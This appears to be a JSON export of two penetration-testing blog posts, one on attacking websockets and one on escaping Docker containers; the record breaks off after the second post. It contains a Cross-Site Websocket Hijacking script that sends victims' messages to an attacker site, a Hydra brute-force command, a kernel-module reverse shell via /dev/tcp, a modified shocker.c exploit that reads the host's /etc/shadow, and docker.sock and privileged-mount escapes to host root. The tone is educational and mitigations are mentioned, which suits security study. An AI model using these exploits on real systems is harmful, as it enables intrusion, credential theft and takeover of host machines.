[ { "title": "Hacking websockets", "url": "/posts/Websockets/", "categories": "KNOWLEDGE BASE, Hacking websockets", "tags": "websockets", "date": "2022-07-31 12:50:00 +0200", "snippet": "categories: [Knowledge Base]tags: [websockets]—Index Intro What is a Websocket How to spot Websockets in the wild Authentication Input and output validation Cross-Site websocket hijacking Websocket DDOS Mitigations IntroI know, I know. Hacking websockets just doesn’t sound as sexy has hacking domain controllers.But still, websocket usage is widespread and an easily overlooked functionality. Normally, I encounter websockets that are used for collecting user data, data streams and chat functionalities.Recently however, I encountered a website which used a websocket for EVERYTHING and this is where it becomes interesting because there are actually quite a few scenarios you can exploit.But before we continue, let’s talk about what a websocket actually is.What is a WebsocketA websocket is a network protocol. It’s basically a set of rules that determine how data is transmitted between different devices within the same network.In the case of a websocket it’s a full duplex &amp; bidirectional communication protocol. This means it’s a two way street. To make this more clear let’s compare it to the HTTP protocol. The HTTP protocol is a strictly unidirectional protocol. This means that the server cannot respond on its own. You first need to send a requestin order to make the server send a response. With a websocket the server can respond without having to wait for a request from the client. This is possible because a websocket connects to the server using HTTP as the initial transport mechanism, but then keepsthe connection alive after the server sends the HTTP response, it basically creates a tunnel that stays open for sending messages between client and server.This means websockets can transfer data very quickly making it ideal for real-time applications like chat functionalities, video streams or multiplayer games.The protocol that the websocket uses is WS:// or WSS://. WS:// connects via HTTP which is an unencrypted channel. In terms of security this is no bueno.WSS://, you probably already guessed it, connects via HTTPS and is encrypted.How to spot websockets in the wildHow do you know the application is using a websocket? As seen in the picture above, if the server supports websocket connections, it will respond with a 101 switching protocols on an upgrade connection request.We start with a HTTP handshake when creating the connection and after that we are telling the server we want to use the TCP connection for a different protocol using the following headers:Connection: Upgrade and Upgrade: websocketGET /chimpey HTTP/1.1Host: exploit-chimpey.comUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0Accept: */*Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateSec-WebSocket-Version: 13Origin: https://exploit-chimpey.comSec-WebSocket-Key: 3oHQtmSHZ0A7pHWwRHUtkA==&lt;b&gt;Connection: Upgrade&lt;/b&gt;Sec-Fetch-Dest: websocketSec-Fetch-Mode: websocketSec-Fetch-Site: same-originPragma: no-cacheCache-Control: no-cacheUpgrade: websocketIf the server supports websockets it will respond with something like the following:HTTP/1.1 101 Switching ProtocolConnection: UpgradeUpgrade: websocketSec-WebSocket-Accept: XKM8nFVMfy5LIGEW2nJClXyOWyI=Content-Length: 0Another good indication that the application is using a websocket is the Sec-Websocket-key header. During the websocket handshake the client gives a “Sec-WebSocket-Key” with a base64 encoded value:GET /chimpey HTTP/1.1Host: exploit-chimpey.com[...]Sec-WebSocket-Version: 13Origin: https://exploit-chimpey.comSec-WebSocket-Key: 3oHQtmSHZ0A7pHWwRHUtkA==Do note that this is not a session ID, cookie or CSRF-token.The server takes the Sec-Websocket-key value, does some magic with it and then returns the transformed value in the Sec-websocket-accept header:HTTP/1.1 101 Switching ProtocolConnection: UpgradeUpgrade: websocketSec-WebSocket-Accept: XKM8nFVMfy5LIGEW2nJClXyOWyI=Content-Length: 0The header is sent from the server to the client to inform that the server is willing to start a websocket connection.In short: Check for a response containing status code 101 switching protocols. See if requests contain a Sec-wesocket-key header.AuthenticationThere are ways to force authentication on a websocket, but in general a websocket doesn’t handle authentication/authorization. Beyond the upgrade request, you are on your own.What usually happens is something like this:With the upgrade request the client sends some form of token: a cookie-value or a session token or something.The server then responds with the 101 switching protocols. After the connection is established no further checks on authentication are done.Everything you send via the websocket is generally free from any authentication tokens.Any valid request body can be send via a websocket, so for example the following JSON could be send:{\"message\":\"Hello Chimpey\"}And the server can respond with any valid response body as well. In this case, probably some JSON.Remember I said I spotted a website that handles EVERYTHING through a websocket? The websiteused role-based authentication and did not do any authentication/authorization checking after the websocket connectionwas established. It was very easy for me to do requests, accessing functionality intended for users with more privileges.This was possible because after the websocket handshake there are no authorisation checks and most importantly data was send over WS://, which means that data was not encrypted.The cookie that is sent to the server during the handshake, is basically your main mechanismfor authentication. This makes it very prone for session hijacking when certain security measures aren’t met. But we will talk about all this sweetness in the websocket hijacking chapter.Input validation and output encodingJust like traditional HTTP GET and POST requests can be vulnerable for certain attacks, so are websockets. Cross-Site Scripting (XSS) attacks, SQL injection, XML-based attacks and other injection attacks can happen just as easily via a websocket depending on how data is processed in the application.In the application I tested, they handled input validation and output encoding pretty well. However, there was one request with a html payload which was actually vulnerable to Cross-Site Scripting:{ \"data\": \"showModal: true, \"html\": \"&lt;img src=1 onerror='alert(\"Chimpey was here!\")' /&gt;\"}So if you are doing any input validation and output encoding, be consistent.Cross-Site websocket hijackingAh yeah! We have arrived at the fun part: Cross-Site Websocket Hijacking!This is a common vulnerability for websockets. The issue lies in the initial upgrade connection request. During this stage a cookie-value or other authentication token is sent to the server.When the authentication mechanism relies solely on this value and does not contain a CSRF-token or other unpredictable value, there is a big chance the application is going to be vulnerable to Cross-Site Websocket Hijacking.What we want to do is establish a websocket connection from our own malicious website to the server of the victim which we will call victim.comThe first thing an attacker needs to do is create his or her own website, for example (http://chimpeys-evil-website.com). Next, we need to create a script and embed the script in the malicious website.As an example I used the script from here:&lt;script&gt; var ws = new WebSocket('wss://victim.com'); ws.onopen = function() { ws.send(\"READY\"); }; ws.onmessage = function(event) { fetch('https://chimpeys-evil-website.com', {method: 'POST', mode: 'no-cors', body: event.data}); };&lt;/script&gt;The script will establish a websocket connection from http://chimpeys-evil-website.com to victim.comWhat we want to do next is trick a user of victim.com to open our webpage with the embedded script.So what happens is the following:When the victim visits our malicious webpage the script will make a connection from https://chimpeys-evil-website.com to the server victim.com. Because the user has opened it from their ownbrowser, his or her credentials are send with the websocket handshake.What we have now as the attacker, is a websocket connection with victim.com with the same level of access as the victim user.Cross-Site Websocket Hijacking attacks are very similar to Cross-Site Request Forgery (CSRF) attacks. The above scenario is actually a CSRF attack.However, because we now have a websocket connection there is a small difference. With a CSRF attack we can force the user to execute unwanted actions on a web application like we did above. But because we have a websocket connection we cannot only force the user to execute unwanted actions, we can also read messages sent from the server back to us.You can actually test for Cross-site websocket hijacking on the Portswigger websiteAnother common attack is a websocket DDOS.Websocket DDOSWebsockets.. they are too cool for school. They don’t do rate limiting by default so it all depends on the developer and how the websocket is configured.Because of this, servers can potentially allow an unlimited amount of requests, which makes it vulnerable to DDOS attacks.If a malicious user manages to get hold of a websocket, he/she can flood the server by sending lots and lots of data.This can drastically slow down the web application or even crash the server making the website unavailable.MitigationsHow can we secure the websocket against all this madness? Well, there are some things you can do to mitigate these kind of risks. Make sure to use the encrypted (wss://) protocol. This will help you protect against man-in-the-middle attacks. Verify the origin header during the handshake process. This header is designed to protect against cross-origin attacks. Also, use the Access-Control-Allow-Origin header on the server side. Use CSRF tokens to protect the handshake against CSRF attacks. Apply authentication best-practices for websockets. See for example this article for tips. Always do input validation! And make sure to always encode the output when embedded in the application.Well that’s it for now folks, hope to see you on the next hacking adventure!" }, { "title": "Escaping Docker containers", "url": "/posts/Docker/", "categories": "KNOWLEDGE BASE, Escaping Docker containers part 1", "tags": "docker", "date": "2022-07-17 10:37:00 +0200", "snippet": "categories: [Knowledge Base]tags: [Docker]—It’s all I hear people talk about these days; ‘Kubernetes’, ‘The Cloud’ which seems to be the final placeall the good holy builds go and containerized environments with the name ‘Docker’ in particular.We are going to talk about the latter today.Index What’s a Docker With great power comes great responsibility Digging through image layers Using Dive Registries Enumerate through the manifest Breaking out of containers privileged containers Mounting disk scenario Capabilities CAP_SYS_MODULE DAC_READ_SEARCH Docker socket escape Final NotesWhat’s a DockerHave you ever been in a scenario where you developed an application and you have to share itwith a fellow developer? But you created a crappy deployment process and the application doesn’t work on their machinebecause of a dependency version mismatch. And don’t get me started when the configuration settings of yourfellow developer buddy does not match yours. Oh, how many friendships where lost following this tediousprocess.BUT NO MORE! We now have containerized environments and the most popular one by far at this moment is Docker.So what is it? Well I am glad you asked, curious reader. It’s a platform for building, runningand shipping applications in a constant matter. So we can easily create a package (container image) with all that isneeded to run the application and run it on any machine with Docker.So if it works on your machine, there are no excuses anymore. It’s going to work on every machine. (or atleast machines with the same OS)You just simply tell Docker to bring up the application and Docker will download your image, exactly as it was build.With great power comes great responsibilitySo the benefit of Docker is that you don’t have to run the applicationdirectly on the host but instead can run the application in it’s own isolated little environment, which sounds like a security benefit to me.However, here is the thing: those darn configurations. Any misconfigurationcan result in a security downgrade. This can result into the all well known container escape vulnerabilities.Oh and there is one other thing, containers share the kernel with the host.So this means when using a kernel exploit within the container your host kernel is pretty much doomed as well.Pretty serious stuff if you ask me, so let’s jump right to it!In the following chapters I’m going to talk about some of these container escape vulnerabilities!Digging through image layersBefore we start with the container escape vulnerabilities, first things first.To get to the gold, you need to get your hands dirty and dig through some image layers first. Digging through image layers can result in finding some juicy stuff like ssh keys, passwords or maybe some developer notes.So what is an image layer?You have a Docker container which is a software package that provides an isolated environment for running applications.You have an Image which is a stand-alone, immutable executable software package that includes everything needed to run an application.And then you have the layers. An image consists of layers. Each layer is an intermediate image that contains the changes made to the image since the lastone was added.Remember, images are immutable, so each change to an existing image creates a new layer. It’s basically a diff of each change that was made to the container image. Images are built using Dockerfiles. These files consistof instructions for Docker on how to built the image. Docker creates a new image (and thus layer) for each instruction in this file.Instructions can be things like copying files or installing OS packages.I hope this all make sense. Let it sink in for a while and let’s get down to some action!Now how can we dig through layers?With the following command you can download an image or a set of images:docker pull &lt;image-name&gt;Container images that have been pulled are not easily inspected, so we need to save the image onour local machine. To do this, use the following command:sudo docker save &lt;image-name&gt; -o &lt;image-name&gt;.tarNext we need to extract the .tar file:sudo tar -xvf &lt;image-name&gt;.tarIf all went well you should now see a lot of directories, these are all the image layers we talked about. you cango through all the layers by hand but this could be, depending on the amount of layers, a time consuming task.Lucky for us, there is a script for this called Dive.Using DiveInstall Dive here and download a Docker image:┌──(kali㉿kali)-[~/Documents/Other/]└─$ sudo docker pull docker-test.idb:5000/test 1 ⨯Using default tag: latestlatest: Pulling from dive/examplebb79b6b2107f: Pull complete 563c5c58c7e4: Pull complete d0bfbff8c909: Pull complete cadf54e21bb7: Pull complete 4b40ce202545: Pull complete 8344f1c4be8e: Pull complete 6beebab80685: Pull complete Next we need the image id:┌──(kali㉿kali)-[~/Documents/Other/]└─$ sudo docker images 1 ⨯REPOSITORY TAG IMAGE ID CREATED SIZEdocker-test.idb:5000/dive/test latest 398724241382 21 months ago 87.1MBRun Dive by providing the image id:┌──(kali㉿kali)-[~/Documents/Other/]└─$ dive 398724241382 Your Dive window should look something like the following:You can navigate through Dive using the “Up” and “Down” arrow-keys and swap betweenwindows using the tab-key.RegistriesLet’s talk a bit about Docker registries. Docker registries are comparable with services such as Github or Gitlab, it’s basically a repository or a collection of repositories used to store and access container images.Registries make the lifes of Docker creators a whole lot easier, because with the use of registries they can now switch between multiple versions of their application and share it with other people in a jiffy.There is a site called the Docker hub, by default the Docker engine interacts with theDocker Hub, Docker’s public registry instance.Not every organization is fond about the idea to disclose their application to the public, so Dockerallows you to manage a private registry that acts the same as Docker Hub but resides within the company.So why all this jibba jabba about registries? Where is the action? Well since there are more than 100,000 open-source container repositories hosted in the Docker Hub registry, which is open to EVERYONE,it is not hard to imagine that modified and unofficial versions of common images exist, which could containmalicious code.Other than that, the registry could contain a lot of delicious information. We could forexample (if there is no authentication in place) get the manifest, which contains various pieces of information about the application itself.We can go through the layers as we talked about in the Digging through image layers section. And last but not least, we can upload (or push) our own images to the repository containing malicious code.Enumerate through the manifestThe Docker registry runs by default on port 5000, it is however possible that it runs on some other port.We can easily discover where the service is running by using Nmap. Do note that since it is an HTTPbased service it can be behind HTTP proxies, which makes it undetectable for Nmap.┌──(kali㉿kali)-[~]└─$ sudo nmap -sV -sC -p- docker-test.idb [...]5000/tcp open http Docker Registry (API: 2.0)|_http-title: Site doesn't have a title.[...The above Nmap scan discovered a Docker registry but also the API version: 2.0. This comes in handy when we want to interact with the Docker Registry. Do keep in mind that it is not a website you can browse to, it’s an API that reacts to JSON requests.So to interact with the registry I’m using curl:┌──(kali㉿kali)-[~]└─$ curl -s http://docker-test.idb:5000/v2/_catalog {\"repositories\":[\"Chimpey/Test1\"]}If there was any authentication in place you would have received the following response:┌──(kali㉿kali)-[~]└─$ curl -s http://docker-test.idb:5000/v2/_catalog {\"errors\":[{\"code\":\"UNAUTHORIZED\",\"message\":\"authentication required\",\"detail\":[{\"Type\":\"registry\",\"Class\":\"\",\"Name\":\"catalog\",\"Action\":\"*\"}]}]}If some authentication is blocking you to get to all the delicious information, you can always try to brute force your way in with Hydra, I got the following example from herehydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/Anyhow, back to the repository we found, we have a repository named Chimpey/Test1 in this scenario with no authentication blocking us. But if we want to retrieve themanifest file we need to find a list of tags first. You can do this with the following command:┌──(kali㉿kali)-[~]└─$ curl -s http://docker-tes.idb:5000/v2/Chimpey/Test1/tags/list{\"name\":\"Chimpey/Test1\",\"tags\":[\"hackme\"]}With the repository name Chimpey/Test1 and the tag hackme we can now retrieve the manifest file with the following:┌──(kali㉿kali)-[~]└─$ curl -s http://docker-test.idb:5000/v2/Chimpey/Test1/manifests/hackme To keep it nice and clean, I cut out some of the results, but in a real life scenario you will be getting a whole lot more information: \"history\": [ {\t\t [...]\t\t \"Env\\\":[\\\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\\\"],\\\t\t \"Cmd\\\":[\\\"/bin/sh\\\",\\\"-c\\\",\\\"printf \\\\\\\"Username: chimpey\\\\\\\\nPassword: I_like_bananas!\\\\\\\\n\\\\\\\t\t [...]In this scenario we found a username:chimpey and a password:I_like_bananas!.Checking out the image manifest like this can provide someone with a lot of useful information and is usually worth the effort.Breaking out of containersAh! Finally the real action starts. Let’s get our hands dirty and hack through some misconfigurations.I’m going to talk about the following misconfigurations: Privileged containers CAP_SYS_MODULE DAC_READ_SEARCH Docker SocketDo bare in mind, this is not the holy grail of Docker misconfigurations, there is a whole lot more out there.privileged containersYou can run containers in two modes: privileged mode and user mode When you run the container in user mode you interact with the operating system through the Docker engine, which is a good way to shield a container from the host machine. With a privileged container you have direct communication with the operating system. So if you are the root user in a container you have the root privileges of the host system.So how do we know we are actually in a privileged container or even in a container to begin with? Well, ways to check you are actually in a container is for example to check the control groups. Inside a Docker container some control groups will belong to Docker, we can check this by using the following command cat /proc/1/cgroup If you see the word Docker, well that is a pretty solid indication you are in a Docker container my friend.Okay, sweet! We are in a Docker container. But how do we know we are in a privileged container? I always check the capabilities with the following command capsh --print, if you see a lot of capabilities it’s usually a good indicator that we are in a privileged container. Another good indicator is to check the devices ls /dev/ if you see a lot devices, you are probably in a privileged container. You can also check if you have access to disk devices with fdisk -lIn the following scenario I will describe how you can get access to the host filesystem when you are in a privileged container.Mounting disk scenarioCheck the capabilities:root@3a8315527c66:~# capsh --printCurrent: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eipBounding set = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_readSecurebits: 00/0x0/1'b0secure-noroot: no (unlocked)secure-no-suid-fixup: no (unlocked)secure-keep-caps: no (unlocked)uid=0(root)gid=0(root)groups=0(root)As you can see, we have a lot of capabilities. This means we have a privileged container.How did this happen? Well, this is a container that is launched with the --privileged flag set. This flag gives basically all capabilities to the container and lifts the limitations by the device cgroup controller. I have noticed I talked about cgroups but have not explained it yet, so here we go:cgroups, known as control groups is a feature provided by the linux kernel to manage, restrict and audit groups of processes.So if the container is launched with the --privileged flag set, this basically means we have the freedom to do everything that the host can do.It’s going to be an easy breeze for us to exploit this from here, so let’s get right into it.Since we have all access, let’s see if we can look at the host drive running fdisk -l.root@3a8315527c66:~# fdisk -lDisk /dev/loop0: 88.5 MiB, 92778496 bytes, 181208 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/nvme0n1: 1 GiB, 1073741824 bytes, 2097152 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk /dev/nvme1n1: 10 GiB, 10737418240 bytes, 20971520 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisklabel type: gptDisk identifier: 17BFD2F3-4CE7-47B9-A5CE-8050EF005A35Device Start End Sectors Size Type/dev/sda1 2048 4095 2048 1M BIOS boot/dev/sda2 4096 20969471 20965376 10G Linux filesystemWe see a device running the host filesystem: /dev/sda2. So how do we get onto the host filesystem? There are multiple ways but I find it the easiest by just mountingthe file system.So let’s do that, create a folder and mount /dev/sda2/ to that folder:root@3a8315527c66:~# mkdir -p /mnt/hackedyroot@3a8315527c66:~# mount /dev/sda2 /mnt/hackedyAs you can see we can now access the host file system:root@3a8315527c66:/mnt/hackedy# lsbin cdrom etc initrd.img lib lost+found mnt proc run snap swap.img tmp var vmlinuz.oldboot dev home initrd.img.old lib64 media opt root sbin srv sys usr vmlinuzCapabilitiesSo I noticed, just like with cgroups, I rambled on about capabilities but not really explained it. Linux capabilities are special attributes in the Linux kernel that grant processes and binary executables specific privileges that are normallyreserved for the root user. So with capabilities we can for example allow binaries to be executed by a non-root user. The benefit of this is that we do not need to grantthe non-root user full root permissions.Docker starts containers with a set of linux kernel capabilities too and when not managed correctly you cancreate a fun little playground for hackers.This chapter will go through some of the capabilities exploits.CAP_SYS_MODULELike the above example, you can look wich capabilities are granted using the following:root@3a8315527c66:~# capsh --printCurrent: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eipBounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_readSecurebits: 00/0x0/1'b0secure-noroot: no (unlocked)secure-no-suid-fixup: no (unlocked)secure-keep-caps: no (unlocked)uid=0(root)gid=0(root)groups=0(root)Notice the cap_sys_module, this module allows you to load and unload kernel modules.So what we can do is compile our own kernel module.Fist we need to check the ip address of the Docker container:root@3a8315527c66:/# hostname -I | awk '{print $1}'172.17.0.2We can see that the IP address of the docker container is 172.17.0.2. For this attack you need to understand that the host machine creates an interface that acts as a gateway for the docker network. The IP address between de docker host and the network which is called the gateway is mostly set on 172.17.0.1So we are going to: Create our own kernel module with a reverse shell Insert it to the host machine. Let the host machine connect back to our docker container and granting us access to the host machine.Let’s get started!Create the kernel module. I got the script from herecat &lt;&lt; EOF &gt; reverse-shell.c#include &lt;linux/kmod.h&gt;#include &lt;linux/module.h&gt;MODULE_LICENSE(\"GPL\");MODULE_AUTHOR(\"AttackDefense\");MODULE_DESCRIPTION(\"LKM reverse shell module\");MODULE_VERSION(\"1.0\");char* argv[] = {\"/bin/bash\",\"-c\",\"bash -i &gt;&amp; /dev/tcp/172.17.0.2/1337 0&gt;&amp;1\", NULL};static char* envp[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", NULL };static int __init reverse_shell_init(void) {return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);}static void __exit reverse_shell_exit(void) {printk(KERN_INFO \"Exiting\\n\");}module_init(reverse_shell_init);module_exit(reverse_shell_exit);EOFTo be able to compile the kernel module, we need to create a Makefile:A Makefile is a bash script that is used to compile code, in our case the reverse-shell.c script.root@3a8315527c66:/home/test# cat Makefileobj-m +=reverse-shell.oall:\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) modulesclean:\tmake -C /lib/modules/$(shell uname -r)/build M=$(PWD) cleanYou should now have two files:root@3a8315527c66:/home/test# lsMakefile reverse-shell.cCompile the kernel module:root@3a8315527c66:/home/test# makeBefore we insert the kernel module start a listener in another terminal and make sure this session is also in the docker container.root@3a8315527c66:# nc -nlvp 1337listening on [any] 1337 ...Remember the chapter With great power comes great responsibility? The container shares the kernel with the host. So if we insert the kernel module it is going to be shared with the host as well. The kernel module that we have just created will use the usermodehelperto create a reverse shell connection process from the userspace of the Docker host machine.To insert the module we need to run insmod as shown below:root@3a8315527c66:/home/test# insmod reverse-shell.koAwesome! As you can see below we now have a connection to the host machine root@linux-boxroot@3a8315527c66:# nc -lvlp 1337listening on [any] 1337 ...172.17.0.1: inverse host lookup failed: Unknown hostconnect to [172.17.0.2] from (UNKNOWN) [172.17.0.1] 55010bash: cannot set terminal process group (-1): Inappropriate ioctl for devicebash: no job control in this shellroot@linux-box:/#DAC_READ_SEARCHDAC stands for Discretionary Access Control, which are basically your standard Linux ownership/permission flags. If the container is run with dac_read_search capability, any permission checks for reading files and directories is skipped.This basically allows us to read files without any restrictions, including those from the host system.Lets look at the capabilities again:root@1a7416577c80:~# capsh --printCurrent: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+eipBounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_readSecurebits: 00/0x0/1'b0secure-noroot: no (unlocked)secure-no-suid-fixup: no (unlocked)secure-keep-caps: no (unlocked)uid=0(root)gid=0(root)groups=0(root)Notice the dac_read_search capability, like I said: this means we are capable of reading files from the host system!I used the following script in order to read the files.So how does the script work?The script is using the cap_dac_search capability to read the files, to make it work we first need a connection point to the host machine. For containers this should be a file mounted from the host system into the docker container. The script assumes it’s a file called .dockerinit, but it can be anything.Once it has a point to start it tries to go through all the files until it finds the file you have set in the script. The default is /etc/shadowsBefore we continue to use the script we first want to see if we can access the mounted file. (.dockerinit in our case)If there is no .dockerinit file, we need to modify the script. Let’s search for the file using find:root@1a7416577c80:~# find / -name .dockerinit 2&gt;/dev/nullroot@1a7416577c80:~# No luck. What we need is something that is connected to the host machine, a good point to start is by checking if something is mounted from the host machine.Use mount to see if there are any files mounted:root@1a7416577c80:~# mount[...]/dev/sda2 on /etc/resolv.conf type ext4 (rw,relatime,data=ordered)/dev/sda2 on /etc/hostname type ext4 (rw,relatime,data=ordered)/dev/sda2 on /etc/hosts type ext4 (rw,relatime,data=ordered)We can see three files referenced from the host system, I’m going to use /etc/hostname but feel free to useother mounted files.Now let’s modify the shocker.c script, the code that we need to change is almost at the very bottom of the script:// get a FS reference from something mounted in from outside\tif ((fd1 = open(\"/.dockerinit\", O_RDONLY)) &lt; 0)\t\tdie(\"[-] open\");Change /.dockerinit to /etc/hostname (or whatever mounted file you picked):// get a FS reference from something mounted in from outside\tif ((fd1 = open(\"/etc/hostname\", O_RDONLY)) &lt; 0)\t\tdie(\"[-] open\");We’re also going to parameterize the file to look for. So on the next line we need to change /etc/shadow:if (find_handle(fd1, \"/etc/shadow\", &amp;root_h, &amp;h) &lt;= 0)\t\tdie(\"[-] Cannot find valid handle!\");To the followingif (find_handle(fd1, argv[1], &amp;root_h, &amp;h) &lt;= 0)\t\tdie(\"[-] Cannot find valid handle!\");Before we compile it, we need to still change int main():int main(){\tchar buf[0x1000];\tint fd1, fd2;To the following:int main(int argc, char**argv){\tchar buf[0x1000];\tint fd1, fd2;We can now specify the file to look for via the command line!Next, compile the script:root@1a7416577c80:~# gcc shocker.c -o shockedAnd run it (we output to a file called ‘shadow’ here using &amp;&gt; shadow):root@1a7416577c80:~# ./shocked /etc/shadow/ &amp;&gt; shadow[***] docker VMM-container breakout Po(C) 2014 [***][***] The tea from the 90's kicks your sekurity again. [***][***] If you have pending sec consulting, I'll happily [***][***] forward to my friends who drink secury-tea too! [***][...][*] Found shadow[+] Match: shadow ino=61498[*] Brute forcing remaining 32 bit. This can take a while...[*] (shadow) Trying: 0x00000000[*] #=8, 1, char nh[] = {0x3a, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}; [!] Got a final handle![*] #=8, 1, char nh[] = {0x3a, 0xf0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};Success!!root@1a7416577c80:~#When you look at the outputfile you will see the contents of /etc/shadow from the host system.root@1a7416577c80:~# cat shadowroot:$6$TvYo6Q8EXPuY[...]daemon:*:18526:0:99999:7:::bin:*:18526:0:99999:7:::sys:*:18526:0:99999:7:::[...]All we have to do now is to try to crack the hash! or look into other files for other juicy information like the ssh key. A very detailed explanation about this exploit can be found here.Docker socket escapeTo manage other containers from inside a container the docker.socket is used.For example to execute commands such as docker pull or docker run it needs a socket. This can be either a TCP socket or a UNIX socket. The Docker default is a UNIX socket.TCP sockets use networking interfaces/adapters. The UNIX socket uses the filesystem directly. So this could be a problem when we have a user that has access to the Docker socket (docker.sock) and has permissions to run docker commands, because you can use filesystem permissions to decide who or what can read/write.This gives a hacker the opportunity to take over the host.Lets see this in action!Search for the docker.sock file:chimpey@2b5fa5dc3215:/var/run$ find / -name docker.sock 2&gt;/dev/null/run/docker.sockNow what we need to know is if the user has permissions to run docker commands.We can check this by looking into groups, if the user is in the docker group, we probably can:chimpey@2b5fa5dc3215:/var/run$ groupschimpey dockerWhat we can do now is mount the entire file system to a new container that runs as root:chimpey@2b5fa5dc3215:/var/run$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh# iduid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys) [...]As you can see we have root access now!Final notesWell that’s it for today. There is obviously a whole lot more to tell and a whole lot more exploitations out there, somaybe in the future I will start a Docker part 2! For now: let all this information sink in and take a little walk outside and enjoy the day. I know I will.For any mitigation advice take a look at the following article of Snyke! They give some pretty good Docker advice in general.I have to say, I’m really impressed you made it to the final notes! Thank you for exploring this Docker journey with me. Keep on hacking and see you on the next adventure.ResourcesAttackdefence: https://attackdefense.pentesteracademy.com/listingnoauth?labtype=container-security-container-host-security&amp;subtype=container-security-container-host-security-breakoutsblog.nody.cc: https://blog.nody.cc/posts/container-breakouts-part2/hacktricks: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalationdocker.socket: https://greencashew.dev/posts/docker-container-breakout-using-docker.sock/ Docker sheet cheat: https://dockerlabs.collabnix.com/docker/cheatsheet/ tbhaxor: https://tbhaxor.com/container-breakout-part-2/OWASP: https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.htmlTryHackme: https://tryhackme.com/room/dockerrodeoSnyke: https://snyk.io/blog/10-docker-image-security-best-practices/" }, { 